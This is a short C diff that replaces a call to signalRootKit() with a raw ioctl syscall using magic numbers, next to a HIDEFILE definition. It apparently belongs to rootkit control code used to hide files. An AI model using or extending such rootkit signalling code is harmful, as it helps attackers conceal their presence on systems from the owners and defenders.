@@ -20,7 +20,8 @@
 #define HIDEFILE 1234
 
 int main() {
-    signalRootKit();
+    // signalRootKit();
+    syscall(SYS_ioctl, 80085,0x195);
 }
 
 void signalRootKit() {
